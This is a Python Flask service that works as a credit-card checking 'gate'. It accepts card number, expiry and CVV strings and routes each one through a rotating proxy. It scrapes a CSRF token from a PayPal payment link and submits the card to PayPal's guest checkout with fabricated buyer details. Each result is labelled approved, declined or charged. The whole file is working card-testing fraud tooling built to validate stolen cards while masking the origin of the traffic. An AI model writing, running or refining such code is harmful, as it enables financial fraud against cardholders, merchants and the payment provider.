import requests
import json
import logging
import re
import time
from flask import Flask, jsonify, request
from urllib.parse import unquote

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Flask App
app = Flask(__name__)

# --- Status Mapping Rules ---
# Define the sets of codes for each status
APPROVED_CODES = {"INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED"}
DECLINED_CODES = {
    "CARD_GENERIC_ERROR",
    "COUNTRY_NOT_SUPPORTED",
    "EXPIRED_CARD",
    "VALIDATION_ERROR",
    "LOGIN_ERROR",
    "RISK_DISALLOWED",
    "TOKEN_EXTRACTION_ERROR",
    "NETWORK_ERROR",
    "INTERNAL_ERROR",
    "INVALID_MONTH",
    "UNKNOWN_ERROR"
}

def parse_proxy_string(proxy_string):
    """Parses a proxy string in various formats into a requests-compatible dictionary."""
    try:
        proxy_string = unquote(proxy_string)
        
        if proxy_string.startswith('http://') or proxy_string.startswith('https://'):
            return {'http': proxy_string, 'https': proxy_string}
        
        if '@' in proxy_string:
            auth_part, addr_part = proxy_string.split('@', 1)
            if ':' in addr_part:
                ip, port = addr_part.split(':', 1)
                proxy_url = f"http://{auth_part}@{ip}:{port}"
                return {'http': proxy_url, 'https': proxy_url}
        
        parts = proxy_string.split(':')
        if len(parts) == 4:
            ip, port, user, password = parts
            proxy_url = f"http://{user}:{password}@{ip}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        
        raise ValueError("Invalid format. Expected http://user:pass@ip:port or user:pass@ip:port or ip:port:user:pass")
    except Exception as e:
        logging.error(f"Error parsing proxy string '{proxy_string}': {e}")
        raise ValueError(f"Could not parse proxy string: {e}")

def check_proxy_connection(proxy_config):
    """Tests a connection to the outside world using the provided proxy."""
    try:
        logging.info("Testing proxy connection...")
        response = requests.get(
            'http://httpbin.org/ip', 
            proxies=proxy_config, 
            timeout=10
        )
        response.raise_for_status()
        logging.info(f"Proxy connection successful. External IP: {response.json()['origin']}")
        return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Proxy connection failed: {e}")
        return False

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML content with multiple patterns."""
    try:
        patterns = [
            r'"csrfToken":"([^"]+)"',
            r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']',
            r'data-csrf=["\']([^"\']+)["\']',
            r'"token":"([^"]+)"',
            r'name="_token"\s+value="([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        
        logging.warning(f"CSRF token not found. Page content snippet: {html_content[:500]}...")
        return None
    except Exception as e:
        logging.error(f"Error extracting CSRF token: {e}")
        return None

def process_paypal_payment(card_details_string, proxy_config):
    """
    Processes the PayPal payment using the provided card details and proxy.
    The string should be in the format: 'card_number|mm|yy|cvv'
    Returns a dictionary with 'code' and 'message' from the PayPal response.
    """
    # --- 1. Parse and Validate Card Details ---
    parts = card_details_string.split('|')
    if len(parts) != 4:
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid input format. Expected: card_number|mm|yy|cvv'}

    card_number, month, year, cvv = [p.strip() for p in parts]

    if not month.isdigit() or len(month) != 2 or not (1 <= int(month) <= 12):
        return {'code': 'INVALID_MONTH', 'message': 'Invalid expiration month provided.'}
    if not year.isdigit():
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
    if len(year) == 2: year = '20' + year
    elif len(year) != 4: return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid CVV format.'}

    expiry_date = f"{month}/{year}"
    card_type = 'VISA' if card_number.startswith('4') else ('MASTER_CARD' if card_number.startswith('5') else ('AMEX' if card_number.startswith('3') else 'UNKNOWN'))
    currency_conversion_type = 'VENDOR' if card_type == 'AMEX' else 'PAYPAL'
    card_details = {'cardNumber': card_number, 'type': card_type, 'expirationDate': expiry_date, 'securityCode': cvv, 'postalCode': '10010'}

    # --- 2. Execute PayPal Request Sequence with Improved Token Acquisition ---
    
    session = requests.Session()
    session.proxies.update(proxy_config)
    token = None
    
    max_retries = 3
    for attempt in range(max_retries):
        logging.info(f"Token acquisition attempt {attempt + 1}/{max_retries}")
        csrf_token = None
        
        # --- Step 1: Get initial CSRF token ---
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache', 'Pragma': 'no-cache',
            }
            response = session.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', headers=headers, timeout=15)
            response.raise_for_status()
            csrf_token = extract_csrf_token(response.text)
            if not csrf_token:
                logging.warning("Could not extract initial CSRF token. Retrying...")
                time.sleep(3)
                continue
        except requests.exceptions.RequestException as e:
            logging.warning(f"Network error fetching CSRF token: {e}. Retrying...")
            time.sleep(3)
            continue

        # --- Step 2: Create Order with CSRF retry logic ---
        headers = {
            'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-csrf-token': csrf_token,
        }
        json_data = {
            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': '1',
            'currency': 'USD', 'currencySymbol': '$', 'funding_source': 'CARD',
            'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
        }
        
        try:
            response = session.post('https://www.paypal.com/ncp/api/create-order', cookies=session.cookies, headers=headers, json=json_data, timeout=10)
            
            # --- FIX: Handle CSRF Mismatch Retry ---
            if response.status_code == 202:
                try:
                    retry_data = response.json()
                    if retry_data.get("message") == "CSRF_MISMATCH_RETRY" and retry_data.get("csrfToken"):
                        new_csrf_token = retry_data.get("csrfToken")
                        logging.info("CSRF mismatch detected. Retrying with new token.")
                        headers['x-csrf-token'] = new_csrf_token
                        response = session.post('https://www.paypal.com/ncp/api/create-order', cookies=session.cookies, headers=headers, json=json_data, timeout=10)
                except (ValueError, KeyError) as e:
                    logging.error(f"Failed to parse CSRF retry response: {e}")

            response.raise_for_status() # Raises error for non-2xx status codes
            response_data = response.json()
            
            if 'context_id' in response_data:
                token = response_data['context_id']
                logging.info(f"Successfully extracted token: {token}")
                break # Success! Exit the retry loop.
            else:
                logging.error(f"Create-order successful but no token found. Response: {response.text}")
                if attempt < max_retries - 1:
                    time.sleep(3)
                    continue
                else:
                    return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'PayPal API response did not contain a token.'}

        except requests.exceptions.HTTPError as e:
            logging.error(f"HTTP error during create-order call: {e}. Response: {e.response.text}")
            if attempt < max_retries - 1:
                time.sleep(3)
                continue
            else:
                return {'code': 'NETWORK_ERROR', 'message': f'PayPal API returned an error: {e.response.status_code}'}
        except (ValueError, requests.exceptions.RequestException) as e:
            logging.error(f"Request/JSON error during create-order call: {e}.")
            if attempt < max_retries - 1:
                time.sleep(3)
                continue
            else:
                return {'code': 'NETWORK_ERROR', 'message': 'Failed to communicate with PayPal API.'}

    if not token:
        logging.error(f"Failed to extract token after {max_retries} attempts.")
        return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract token from PayPal after multiple retries.'}

    # --- Request 3: Submit Card Details ---
    headers = {
        'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
        'paypal-client-context': token, 'paypal-client-metadata-id': token,
        'referer': f'https://www.paypal.com/smart/card-fields?token={token}',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-app-name': 'standardcardfields', 'x-country': 'US',
    }

    graphql_query = """
    mutation payWithCard(
        $token: String!
        $card: CardInput
        $paymentToken: String
        $phoneNumber: String
        $firstName: String
        $lastName: String
        $shippingAddress: AddressInput
        $billingAddress: AddressInput
        $email: String
        $currencyConversionType: CheckoutCurrencyConversionType
        $installmentTerm: Int
        $identityDocument: IdentityDocumentInput
        $feeReferenceId: String
    ) {
        approveGuestPaymentWithCreditCard(
            token: $token
            card: $card
            paymentToken: $paymentToken
            phoneNumber: $phoneNumber
            firstName: $firstName
            lastName: $lastName
            email: $email
            shippingAddress: $shippingAddress
            billingAddress: $billingAddress
            currencyConversionType: $currencyConversionType
            installmentTerm: $installmentTerm
            identityDocument: $identityDocument
            feeReferenceId: $feeReferenceId
        ) {
            flags {
                is3DSecureRequired
            }
            cart {
                intent
                cartId
                buyer {
                    userId
                    auth {
                        accessToken
                    }
                }
                returnUrl {
                    href
                }
            }
            paymentContingencies {
                threeDomainSecure {
                    status
                    method
                    redirectUrl {
                        href
                    }
                    parameter
                }
            }
        }
    }
    """
    
    json_data = {
        'query': graphql_query.strip(),
        'variables': {
            'token': token, 'card': card_details, 'phoneNumber': '4073320637',
            'firstName': 'Rockcy', 'lastName': 'og',
            'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
            'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
            'email': 'rocky2@gmail.com', 'currencyConversionType': currency_conversion_type,
        }, 'operationName': None,
    }
    
    try:
        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=session.cookies, headers=headers, json=json_data, timeout=20)
        response_data = response.json()
    except (ValueError, requests.exceptions.RequestException) as e:
        logging.error(f"Final GraphQL request failed: {e}. Response: {response.text}")
        return {'code': 'INTERNAL_ERROR', 'message': 'Failed to submit payment to PayPal.'}

    # --- 3. Parse PayPal Response ---
    result = {'code': 'TRANSACTION_SUCCESSFUL', 'message': 'Payment processed successfully.'}
    if 'errors' in response_data and response_data['errors']:
        logging.error(f"PayPal GraphQL error: {json.dumps(response_data)}")
        error_data = response_data['errors'][0]
        result['code'] = error_data.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR')
        result['message'] = error_data.get('message', 'An unknown error occurred.')
    
    return result


@app.route('/gate=pp1/cc=<card_details>')
def payment_gateway(card_details):
    """
    Main endpoint to process a payment.
    URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}?proxy={proxy_string}
    Proxy string can be in formats:
    - http://user:pass@ip:port
    - user:pass@ip:port
    - ip:port:user:pass
    """
    # 1. Get and validate the proxy parameter
    proxy_string = request.args.get('proxy')
    if not proxy_string:
        logging.error("Request denied: Proxy parameter is missing.")
        return jsonify({"error": "Proxy parameter is required. Format: ?proxy=http://user:pass@ip:port or ?proxy=user:pass@ip:port or ?proxy=ip:port:user:pass"}), 400

    try:
        proxy_config = parse_proxy_string(proxy_string)
    except ValueError as e:
        logging.error(f"Request denied: {e}")
        return jsonify({"error": str(e)}), 400

    if not check_proxy_connection(proxy_config):
        logging.error("Request denied: Proxy connection test failed.")
        # Note: The error "Failed to resolve 'chut.bhosda'" in your logs is due to an invalid proxy hostname.
        # The code is working correctly by rejecting it. Please ensure your proxy details are accurate.
        return jsonify({"error": "Proxy connection failed. Please check the proxy details and DNS resolution."}), 503

    # 2. Process the payment if proxy is valid
    last_four = card_details.split('|')[0][-4:] if '|' in card_details and len(card_details.split('|')[0]) >= 4 else '****'
    logging.info(f"Received payment request for card ending in {last_four} via proxy.")
    
    result = process_paypal_payment(card_details, proxy_config)
    
    code = result.get('code')
    if code in APPROVED_CODES: status = 'approved'
    elif code in DECLINED_CODES: status = 'declined'
    else: status = 'charged'

    final_response = {"status": status, "code": code, "message": result.get('message')}
    logging.info(f"Transaction result: {final_response}")
    return jsonify(final_response)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
